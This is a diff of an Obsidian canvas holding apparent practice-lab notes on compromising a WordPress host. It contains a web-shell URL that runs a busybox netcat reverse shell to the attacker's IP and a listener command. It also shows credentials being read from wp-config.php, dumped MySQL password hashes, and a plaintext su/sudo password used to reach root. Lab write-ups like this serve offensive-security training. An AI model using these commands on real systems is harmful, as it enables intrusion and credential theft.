@@ -1,8 +1,7 @@
 {
 	"nodes":[
 		{"id":"b0bb3062f70898b9","type":"group","x":300,"y":-379,"width":290,"height":269,"label":"TCP open"},
-		{"id":"0f96434d1021210c","type":"group","x":3385,"y":-297,"width":290,"height":197,"label":"Untitled group"},
-		{"id":"44bea3d7591176a8","type":"text","text":"# SHELL","x":2928,"y":3600,"width":180,"height":60,"color":"1"},
+		{"id":"0f96434d1021210c","type":"group","x":3300,"y":-160,"width":290,"height":197,"label":"Attack vector"},
 		{"id":"f1f25a4ed93d81a5","type":"text","text":"## Target","x":-372,"y":-280,"width":250,"height":60,"color":"1"},
 		{"id":"bb26486006ce622b","type":"text","text":"port 21","x":320,"y":-359,"width":250,"height":60},
 		{"id":"86feb7ac5da8844d","type":"text","text":"port 22","x":320,"y":-280,"width":250,"height":60},
@@ -13,12 +12,9 @@
 		{"id":"3ffe3684558f80c2","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260717120822.png","x":1783,"y":-270,"width":314,"height":400},
 		{"id":"a25b6b9f52b5c3bf","type":"text","text":"/wordpress/","x":1520,"y":-100,"width":138,"height":60},
 		{"id":"29b4de13f79c71bf","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260717120519.png","x":2470,"y":-350,"width":675,"height":560},
-		{"id":"d116fc78b726daab","type":"text","text":"Add ur theme","x":3405,"y":-277,"width":250,"height":60},
-		{"id":"5f12416bd8d045a4","type":"text","text":"Change plugin","x":3405,"y":-180,"width":250,"height":60},
 		{"id":"b4e51e28ffc6ec30","type":"text","text":"pentestmonkey@pentestmonkey.net","x":2254,"y":788,"width":337,"height":57},
 		{"id":"3c80361cecf34ffe","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260717121408.png","x":2608,"y":423,"width":399,"height":365},
 		{"id":"3f775ce704e95d85","type":"text","text":"rlwrap nc -nlvp 4444 (Terminal)","x":2152,"y":1188,"width":318,"height":60,"color":"1"},
-		{"id":"e82afe47ba460a69","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260717122125.png","x":2638,"y":900,"width":391,"height":460},
 		{"id":"a26799b47475ec9c","type":"text","text":"~~~python\nwww-data@ubuntu:/home$ ls\nls\nbtrisk\nwww-data@ubuntu:/home$ cd /btrisk\ncd /btrisk\nbash: cd: /btrisk: No such file or directory\nwww-data@ubuntu:/home$ cd btrisk\ncd btrisk\nwww-data@ubuntu:/home/btrisk$ ls\nls\nlocal.txt\nwww-data@ubuntu:/home/btrisk$ cat local.txt\ncat local.txt\neef2b7aff376ec4204f9d996cfe28e65\nwww-data@ubuntu:/home/btrisk$ sudo --version\nsudo --version\nSudo version 1.8.16\nSudoers policy plugin version 1.8.16\nSudoers file grammar version 45\nSudoers I/O plugin version 1.8.16\nwww-data@ubuntu:/home/btrisk$ su btrisk\nsu btrisk\nPassword: roottoor\n\nbtrisk@ubuntu:~$ ls               ls\nls\nlocal.txt\nbtrisk@ubuntu:~$ ls -la           ls -la\nls -la\ntotal 36\ndrwxr-xr-x 4 btrisk 1000 4096 Jul  9  2020 .\ndrwxr-xr-x 3 root   root 4096 Mar 17  2017 ..\n-rw------- 1 btrisk 1000    0 Jul  9  2020 .bash_history\n-rw-r--r-- 1 btrisk 1000  220 Mar 17  2017 .bash_logout\n-rw-r--r-- 1 btrisk 1000 3771 Mar 17  2017 .bashrc\ndrwx------ 2 btrisk 1000 4096 Mar 17  2017 .cache\n-rw-r--r-- 1 btrisk 1000   33 Jul 17 02:27 local.txt\n-rw------- 1 btrisk 1000    0 Mar  6  2020 .mysql_history\ndrwxrwxr-x 2 btrisk 1000 4096 Mar 21  2017 .nano\n-rw-r--r-- 1 btrisk 1000  655 Mar 17  2017 .profile\n-rw-r--r-- 1 btrisk 1000    0 Mar 17  2017 .sudo_as_admin_successful\n-rw------- 1 btrisk 1000  586 Mar 21  2017 .viminfo\nbtrisk@ubuntu:~$ cat local.txt    cat local.txt\ncat local.txt\neef2b7aff376ec4204f9d996cfe28e65\nbtrisk@ubuntu:~$ cat local.txt    cat local.txt\n","x":3400,"y":1218,"width":636,"height":1228},
 		{"id":"c5dba649257ca3a1","type":"text","text":"```\nhttp://192.168.104.50/wordpress/?cmd=busybox nc 192.168.45.189 4444 -e sh\n```","x":1940,"y":1360,"width":678,"height":60},
 		{"id":"7258b74be602904a","type":"text","text":"```\n\nmysql> select user , authentication_string from user;\nselect user , authentication_string from user;\n+------------------+-------------------------------------------+\n| user             | authentication_string                     |\n+------------------+-------------------------------------------+\n| root             | *CBE70E8EFEC686415DAA1FDAD3366E4E3CBFB054 |\n| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |\n| debian-sys-maint | *2F25DBB5350A24EC4A033EC3B8AECEC3DFCD1F08 |\n| phpmyadmin       | *00A51F3F48415C7D4E8908980D443C29C69B60C9 |\n| btrisk           | *C6BC7C8E7FC79FCBC09C05E65F6BBDA781FCD6D0 |\n+------------------+-------------------------------------------+\n5 rows in set (0.00 sec)\n\n\n```","x":1520,"y":2176,"width":620,"height":344},
@@ -27,10 +23,14 @@
 		{"id":"0a2d2705e131ff9d","type":"text","text":"~~~python\nbtrisk@ubuntu:/home$ sudo su              sudo su\nsudo su\n[sudo] password for btrisk: roottoor\n\nroot@ubuntu:/home# ls                 ls\nls\nbtrisk\nroot@ubuntu:/home# cat /root/proof.txtcat /root/proof.txt\ncat /root/proof.txt\n8320a855ba5474f76124eb1577f98f23\nroot@ubuntu:/home# ","x":3300,"y":3120,"width":639,"height":305},
 		{"id":"bfeb7dfaabf1673c","type":"text","text":"# SHELL","x":2280,"y":1519,"width":190,"height":60},
 		{"id":"c89da06ace9c3dc7","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260717155246.png","x":1830,"y":3279,"width":640,"height":480},
-		{"id":"5c1824987e91bb9d","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260717122315.png","x":2618,"y":1480,"width":400,"height":138},
-		{"id":"e281ba7a2614f9a4","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260717144050.png","x":2618,"y":1680,"width":400,"height":315},
 		{"id":"a8d5ce52c6b189d6","type":"text","text":"```python\nwww-data@ubuntu:/home/btrisk$ sudo --version\nsudo --version\nSudo version 1.8.16\nSudoers policy plugin version 1.8.16\nSudoers file grammar version 45\nSudoers I/O plugin version 1.8.16\nwww-data@ubuntu:/home/btrisk$ \n\n```","x":3500,"y":2480,"width":506,"height":213},
-		{"id":"8870c9e9929a881a","type":"text","text":"```python\nwww-data@ubuntu:/var/www/html/wordpress$ cat wp-config.php\ncat wp-config.php\n<?php\n/**\n * The base configurations of the WordPress.\n *\n * This file has the following configurations: MySQL settings, Table Prefix,\n * Secret Keys, WordPress Language, and ABSPATH. You can find more information\n * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing\n * wp-config.php} Codex page. You can get the MySQL settings from your web host.\n *\n * This file is used by the wp-config.php creation script during the\n * installation. You don't have to use the web site, you can just copy this file\n * to \"wp-config.php\" and fill in the values.\n *\n * @package WordPress\n */\n\n// ** MySQL settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine('DB_NAME', 'wordpress');\n\n/** MySQL database username */\ndefine('DB_USER', 'root');\n\n/** MySQL database password */\ndefine('DB_PASSWORD', 'rootpassword!');\n\n/** MySQL hostname */\ndefine('DB_HOST', 'localhost');\n\n```","x":2380,"y":2080,"width":749,"height":732}
+		{"id":"44bea3d7591176a8","type":"text","text":"# SHELL","x":2928,"y":3600,"width":180,"height":60,"color":"1"},
+		{"id":"d116fc78b726daab","type":"text","text":"Add ur theme","x":3320,"y":-140,"width":250,"height":60},
+		{"id":"5f12416bd8d045a4","type":"text","text":"Change plugin","x":3320,"y":-43,"width":250,"height":60},
+		{"id":"e82afe47ba460a69","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260717122125.png","x":2612,"y":900,"width":391,"height":460},
+		{"id":"5c1824987e91bb9d","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260717122315.png","x":2608,"y":1480,"width":400,"height":138},
+		{"id":"e281ba7a2614f9a4","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260717144050.png","x":2608,"y":1680,"width":400,"height":315},
+		{"id":"8870c9e9929a881a","type":"text","text":"```python\nwww-data@ubuntu:/var/www/html/wordpress$ cat wp-config.php\ncat wp-config.php\n<?php\n/**\n * The base configurations of the WordPress.\n *\n * This file has the following configurations: MySQL settings, Table Prefix,\n * Secret Keys, WordPress Language, and ABSPATH. You can find more information\n * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing\n * wp-config.php} Codex page. You can get the MySQL settings from your web host.\n *\n * This file is used by the wp-config.php creation script during the\n * installation. You don't have to use the web site, you can just copy this file\n * to \"wp-config.php\" and fill in the values.\n *\n * @package WordPress\n */\n\n// ** MySQL settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine('DB_NAME', 'wordpress');\n\n/** MySQL database username */\ndefine('DB_USER', 'root');\n\n/** MySQL database password */\ndefine('DB_PASSWORD', 'rootpassword!');\n\n/** MySQL hostname */\ndefine('DB_HOST', 'localhost');\n\n```","x":2434,"y":2080,"width":749,"height":732}
 	],
 	"edges":[
 		{"id":"d364068a3308e801","fromNode":"f1f25a4ed93d81a5","fromSide":"bottom","toNode":"2640b78b0e4f661b","toSide":"top","color":"1"},
@@ -62,6 +62,10 @@
 		{"id":"2f236573751e82ea","fromNode":"8870c9e9929a881a","fromSide":"right","toNode":"a26799b47475ec9c","toSide":"left","color":"4"},
 		{"id":"ce569a3c637698b8","fromNode":"44bea3d7591176a8","fromSide":"top","toNode":"0a2d2705e131ff9d","toSide":"left"},
 		{"id":"a9055606a10a6360","fromNode":"f5094200fa7f9dfe","fromSide":"bottom","toNode":"44bea3d7591176a8","toSide":"top"},
-		{"id":"a54dfe741783f174","fromNode":"f1f25a4ed93d81a5","fromSide":"bottom","toNode":"2640b78b0e4f661b","toSide":"top"}
+		{"id":"a54dfe741783f174","fromNode":"f1f25a4ed93d81a5","fromSide":"bottom","toNode":"2640b78b0e4f661b","toSide":"top"},
+		{"id":"93e00a47284116de","fromNode":"bb26486006ce622b","fromSide":"right","toNode":"86feb7ac5da8844d","toSide":"right"},
+		{"id":"7df768b1cb70d2f0","fromNode":"c9b01329081f56f8","fromSide":"right","toNode":"e677991d5620d62d","toSide":"left"},
+		{"id":"763c77e1065be254","fromNode":"8870c9e9929a881a","fromSide":"left","toNode":"c934686510c9a7a3","toSide":"top"},
+		{"id":"081bdc7229c374d3","fromNode":"c89da06ace9c3dc7","fromSide":"right","toNode":"f5094200fa7f9dfe","toSide":"left"}
 	]
 }
